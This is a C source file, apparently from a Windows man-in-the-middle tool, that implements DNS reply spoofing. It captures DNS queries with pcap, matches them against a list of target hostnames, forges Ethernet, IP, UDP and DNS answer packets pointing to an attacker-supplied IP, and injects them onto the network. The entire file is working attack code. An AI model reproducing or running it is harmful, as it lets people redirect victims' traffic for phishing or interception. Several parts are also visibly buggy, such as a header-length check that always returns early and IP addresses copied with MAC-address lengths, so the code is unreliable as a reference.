#include <stdio.h>
#include <pcap.h>

#include "APE.h"
#include "LinkedListSpoofedDNSHosts.h"
#include "RequestSpoofingPacketCrafter.h"
#include "NetDns.h"

extern PHOSTNODE gHostsList;


/*
 *
 *
 */
void *DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
{
  PETHDR ethrHdr = (PETHDR)dataParam;
  PIPHDR ipHdr = NULL;
  PUDPHDR updHdr = NULL;
  int ipHdrLen = 0;
  char *data = NULL;
  char *dnsData = NULL;
  PHOSTNODE retVal = NULL;
  PHOSTNODE tmpNode = NULL;
  PDNS_HDR dnsHdr = NULL;
  unsigned char *reader = NULL;
  int stop;
  unsigned char *peerName = NULL;


  if (gHostsList->next == NULL || ethrHdr == NULL || htons(ethrHdr->ether_type) != ETHERTYPE_IP)
  {
    return retVal;
  }

//  ipHdr = (PIPHDR)(data + sizeof(ETHDR));
  ipHdr = (PIPHDR)(dataParam + sizeof(ETHDR));

  if (ipHdr == NULL || ipHdr->proto != IP_PROTO_UDP)
  {
    return retVal;
  }

  ipHdrLen = (ipHdr->ver_ihl & 0xf) * 4;

  if (ipHdrLen > 0)
  {
    return retVal;
  }

  updHdr =  (PUDPHDR) ((unsigned char*) ipHdr + ipHdrLen);

  if (updHdr == NULL || updHdr->ulen <= 0 || ntohs(updHdr->dport) != 53)
  {
    return retVal;
  }

  dnsData = ((char*) updHdr + sizeof(UDPHDR));
  dnsHdr = (PDNS_HDR) &dnsData[sizeof(DNS_HDR)];

  if (dnsHdr == NULL)
  {
    return retVal;
  }

  if (ntohs(dnsHdr->q_count) <= 0)
  {
    return retVal;
  }

  reader = (unsigned char *) &dnsData[sizeof(DNS_HDR)];
  stop = 0;
  peerName = dns2Text2(reader, (unsigned char *) dnsHdr, &stop);

  if ((tmpNode = GetNodeByHostname(gHostsList, peerName)) != NULL)
  {
    retVal = tmpNode;
  }

  return retVal;
}



/*
 *
 *
 */
void InjectDNSPacket(unsigned char * rawPacket, pcap_t *deviceHandle, char *spoofedIp, char *srcIp, char *dstIp, char *hostName)
{
  unsigned char *dnsPacket = NULL;
  int packetsize = 0;
  int etherPacketSize = sizeof(ETHDR);
  int ipPacketSize = sizeof(IPHDR);
  int udpPacketSize = sizeof(UDPHDR);
  int dnsPacketSize = sizeof(DNS_BASIC) + sizeof(DNS_QUERY) + sizeof(DNS_ANSWER);
  unsigned short dstPort = 0;
  unsigned short srcPort = 0;
  PETHDR ethrHdr = (PETHDR) rawPacket;
  PIPHDR ipHdr = NULL;
  PUDPHDR udpHdr = NULL;
  PUDPHDR udpHdr2 = NULL;
  PDNS_BASIC dnsBasicHdr = NULL;
  PDNS_QUERY dnsQueryHdr = NULL;
  PDNS_BASIC dnsAnswerHdr = NULL;
  IPADDRESS srcAddr, dstAddr;
  unsigned long ulTmp = 0;
  unsigned short transactionId = 0;
  int counter = 0;
  unsigned char *dnsUrlA = NULL;
  unsigned char *dnsUrl = NULL;
  unsigned char destMacBin[BIN_MAC_LEN];
  unsigned char srcMacBin[BIN_MAC_LEN];
  unsigned char srcIpBin[BIN_IP_LEN];
  unsigned char dstIpBin[BIN_IP_LEN];

  // 1. Copy source and destination MAC addresses
  CopyMemory(destMacBin , ethrHdr->ether_dhost, BIN_MAC_LEN);	
  CopyMemory(srcMacBin , ethrHdr->ether_shost, BIN_MAC_LEN);

  // 2. Copy source and destination IP addresses
  ipHdr = (PIPHDR) (rawPacket + sizeof(ETHDR));
  CopyMemory(dstIpBin, &ipHdr->daddr, BIN_MAC_LEN);	
  CopyMemory(srcIpBin, &ipHdr->saddr, BIN_MAC_LEN);

  // 3. Copy src(client) and dest(dns server) port
  udpHdr2 = (PUDPHDR) (rawPacket + etherPacketSize + ipPacketSize);
  dstPort = ntohs(udpHdr2->sport);	// client's port=attack pkt's dest port
  srcPort = ntohs(udpHdr2->dport);	// dns server's port (53)=attack pkt's src port
  
  dnsBasicHdr = (PDNS_BASIC) (rawPacket + etherPacketSize + ipPacketSize + udpPacketSize);

  // Copy the transaction id 
  transactionId = dnsBasicHdr->trans_id;
  dnsUrl = (unsigned char *) (rawPacket + etherPacketSize + ipPacketSize+ udpPacketSize + sizeof(DNS_BASIC));

  if ((dnsUrlA = (unsigned char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_BUF_SIZE*2)) == NULL)
  {
    LogMsg(DBG_ERROR, "InjectDNSPacket(): HeapAlloc(%d) failed (Error code: %d)", MAX_BUF_SIZE*2, GetLastError());
    goto END;
  } 

  for (counter = 0; dnsUrl[counter] != 0; counter++)
    dnsUrlA[counter] = dnsUrl[counter];

  dnsUrlA[counter] = 0;
  counter++;

  // Set up the incoming packet, and check if it's a DNS types A query
  dnsQueryHdr = (PDNS_QUERY) (rawPacket + sizeof(ETHDR) + sizeof(IPHDR) + sizeof(UDPHDR) + sizeof(DNS_BASIC) + counter);

  //return if it's not type A
  //  if (lDNSQueryHdr->q_type != htons(0x0001))
  //    goto END;

  // Calculate the total attack packet size
  packetsize = counter + etherPacketSize + ipPacketSize + udpPacketSize + dnsPacketSize;	

  // Allocate memory for the DNS response packet		
  if ((dnsPacket = (unsigned char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, packetsize+1)) == NULL)  
  {
    LogMsg(DBG_ERROR, "InjectDNSPacket(): HeapAlloc(%d) failed (Error code: %d)", packetsize+1, GetLastError());
    goto END;
  }

  ZeroMemory((char *) dnsPacket, packetsize);	

  // 0. Initialize the packet and copy the IP addr over
  ulTmp = inet_addr((const char *) dstIp);
  CopyMemory(&srcAddr, &ulTmp, sizeof(ulTmp));
  ulTmp = inet_addr((const char *) srcIp);
  CopyMemory(&dstAddr, &ulTmp, sizeof(ulTmp));

  // 1. Generate ethernet header for lDNSPacket
  GenerateEtherPacket2(dnsPacket,  (unsigned char *) destMacBin,  (unsigned char *) srcMacBin);

  // 2. Generate IP header for lDNSPacket
  ipHdr = (PIPHDR) (dnsPacket + etherPacketSize);
  GenerateIPPacket2((unsigned char *) ipHdr, IPPROTO_UDP, srcAddr, dstAddr, packetsize);

  // 3. Generate UDP header for lDNSPacket
  udpHdr = (PUDPHDR) ((unsigned char *) ipHdr + ipPacketSize);
  GenerateUDPPacket2((unsigned char *) udpHdr, packetsize, srcPort, dstPort);

  // 4. Generate DNS header for lDNSPacket
  dnsAnswerHdr = (PDNS_BASIC) ((unsigned char *) udpHdr + udpPacketSize);
  GenerateDNSPacket2((unsigned char *) dnsAnswerHdr, counter, dnsUrl, transactionId, spoofedIp);

  ethrHdr = (PETHDR) dnsPacket;

  // Keep sending the crafted dns reply packet to client till max 5 times if not successful
  for (counter = 5; counter > 0; counter--) 
  {
    if (pcap_sendpacket(deviceHandle, (unsigned char *) dnsPacket, packetsize ) != 0)
      LogMsg(DBG_ERROR, "Request DNS poisoning failed : %s -> %s", hostName, spoofedIp);
    else 
    {
      LogMsg(DBG_ERROR, "Request DNS pisoning succeeded : %s -> %s", hostName, spoofedIp);
      break;
    }
  }

END:

  if (dnsPacket != NULL)
  {
    __try
    {
      HeapFree(GetProcessHeap(), 0, dnsPacket);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
    }
  }

  if (dnsUrlA != NULL)
  {
    __try
    {
      HeapFree(GetProcessHeap(), 0, dnsUrlA);
    }
    __except (EXCEPTION_EXECUTE_HANDLER)
    {
    }
  }
}



/*
 *
 *
 */
void GenerateEtherPacket2(unsigned char * packet, unsigned char * dstMac, unsigned char * srcMac)
{
  PETHDR ethrHeader = (PETHDR) packet;
  int counter;

  // handle the MAC of source and destination of packet
  for (counter = 0; counter < BIN_MAC_LEN; counter++)	
    ethrHeader->ether_dhost[counter] = srcMac[counter];

  for (counter = 0; counter < BIN_MAC_LEN; counter++)	
    ethrHeader->ether_shost[counter] = dstMac[counter];

  ethrHeader->ether_type = htons(0x0800);  //type of ethernet header
}



/*
 *
 *
 */
void GenerateIPPacket2(unsigned char *packet, unsigned char ipProtocol, IPADDRESS srcIpAddr, IPADDRESS dstIpAddr, unsigned short dnsPacketSize)
{
  PIPHDR ipHdr = (PIPHDR) packet;

  // Populate ip header fields
  ipHdr->ver_ihl = 0x45;	// Version of IP header = 4
  ipHdr->tos = 0x00;		// Type of service
  dnsPacketSize = dnsPacketSize - sizeof(ETHDR);
  ipHdr->tlen = htons(dnsPacketSize); // Length of packet
  ipHdr->identification = htons((unsigned short) GetCurrentProcessId()); // Packet identification=process ID
  ipHdr->flags_fo = htons(0x0000);// Fragment offset field and u16_flags
  ipHdr->ttl = 0x3a; 	// Time to live  (58 sec)
  ipHdr->proto = ipProtocol; // Protocol;
  ipHdr->saddr = srcIpAddr;	// Source IP address = dns server
  ipHdr->daddr = dstIpAddr;	// Destination IP address = client
  ipHdr->crc = (unsigned short) in_cksum2((unsigned short *) ipHdr, sizeof(IPHDR)); //check_sum
}




/*
 *
 *
 */
void GenerateDNSPacket2(unsigned char * packet, unsigned short dnsHdrLength, unsigned char * dnsUrlA, unsigned short transactionId, char *spoofedIp)
{
  PDNS_BASIC dnsBasidHdr = (PDNS_BASIC) packet;
  PDNS_QUERY dnsQueryHdr = NULL;
  PDNS_ANSWER dnsAnswerHdr = NULL;
  char *dnsUrl = NULL;
  struct in_addr lSpoofedIPAddr;

  //
  lSpoofedIPAddr.s_addr = inet_addr(spoofedIp);

  //setting up the basic structure of a DNS packet
  dnsBasidHdr->trans_id = transactionId;
  dnsBasidHdr->flags = htons(0x8180);
  dnsBasidHdr->ans = htons(0x0001);
  dnsBasidHdr->ques = htons(0x0001);
  dnsBasidHdr->add = htons(0x0000);
  dnsBasidHdr->auth = htons(0x0000);

  // Copy the URL over
  dnsUrl = (char *) (packet + sizeof(DNS_BASIC));

  ZeroMemory((char *) dnsUrl, dnsHdrLength);
  CopyMemory(dnsUrl, dnsUrlA, dnsHdrLength);

  // Setting up the query structure of a DNS packet
  dnsQueryHdr = (PDNS_QUERY) (packet + sizeof(DNS_BASIC) + dnsHdrLength) ;	
  dnsQueryHdr->q_class = htons(0x0001);
  dnsQueryHdr->q_type = htons(0x0001);

  // Setting up the answer structure of a DNS packet
  dnsAnswerHdr = (PDNS_ANSWER) (packet + sizeof(DNS_BASIC) + dnsHdrLength + sizeof(DNS_QUERY));	
  dnsAnswerHdr->a_url = htons(0xc00c);   // URL in question
  dnsAnswerHdr->a_type = htons(0x0001);  // type of query
  dnsAnswerHdr->a_class = htons(0x0001); // class of query->class IN
  dnsAnswerHdr->a_ttl1 = htons(0x0000);
  dnsAnswerHdr->a_ttl2 = htons(0x003a);  // time to live (4bytes)=0000003a=58s
  dnsAnswerHdr->a_len = htons(0x0004);   // Length of resource data length=length of Type A reply =4 bytes IP address
  dnsAnswerHdr->a_ip = lSpoofedIPAddr;   //user-specified IP
}




/*
 *
 *
 */
void GenerateUDPPacket2(unsigned char * packet, unsigned short udpPacketLength, unsigned short srcPort, unsigned short dstPort)
{
  PUDPHDR udpHdr = (PUDPHDR) packet;

  // Populate UDP header fields
  udpHdr->sport = htons(srcPort);	// Attack packet source port
  udpHdr->dport = htons(dstPort);	// Attack_packet destination port

  udpPacketLength = udpPacketLength - sizeof(IPHDR) - sizeof(ETHDR);
  udpHdr->ulen = htons(udpPacketLength);		// Length
  udpHdr->sum = 0;
}



/*
 *
 *
 */
unsigned short in_cksum2(unsigned short * address, int length)
{
  register int sum = 0;
  unsigned short checkSum = 0;
  register unsigned short *w = address;
  register int numLeft = length;

  // Using a 32 bit accumulator (sum), u16_add sequential 16 bit words to it, and at the end, fold back all the
  // carry bits from the top 16 bits into the lower 16 bits.
  while (numLeft > 1)  
  {
    sum += *w++;
    numLeft -= 2;
  }

  //handle odd byte
  if (numLeft == 1) 
  {
    *(unsigned char *) (&checkSum) = *(unsigned char *) w;
    sum += checkSum;
  }

  // u16_add back carry outs from top 16 bits to low 16 bits 
  sum = (sum >> 16) + (sum & 0xffff);     // u16_add high 16 to low 16 
  sum += (sum >> 16);                      // u16_add carry 
  checkSum = ~sum;                         // truncate to 16 bits

  return checkSum;
}



/*
 * From dns2Text
 *
 */
unsigned char* dns2Text2(unsigned char* reader, unsigned char* buffer, int *count)
{
  unsigned char *name;
  unsigned int p = 0;
  unsigned int jumped = 0;
  unsigned int offset;
  int i;
  int j;

  *count = 1;
  name = (unsigned char*) malloc(256);
  name[0] = '\0';

  //read the names in 3www6google3com format
  while (*reader != 0)
  {
    if (*reader >= 192)
    {
      offset = (*reader)*256 + *(reader + 1) - 49152; //49152 = 11000000 00000000 ;)
      reader = buffer + offset - 1;
      jumped = 1; //we have jumped to another location so counting wont go up!
    }
    else
      name[p++] = *reader;    

    reader = reader + 1;

    if (jumped == 0)
      *count += 1; //if we havent jumped to another location then we can count up    
  }

  name[p] = '\0'; //string complete

  if (jumped == 1)
    *count = *count + 1; //number of steps we actually moved forward in the packet

  //now convert 3www6google3com0 to www.google.com
  for (i = 0; i < (int) strlen((const char*) name); i++)
  {
    p = name[i];
    for (j = 0; j < (int) p; j++)
    {
      name[i] = name[i+1];
      i++;
    }

    name[i] = '.';
  }

  name[i-1] = '\0'; //remove the last dot

  return name;
}
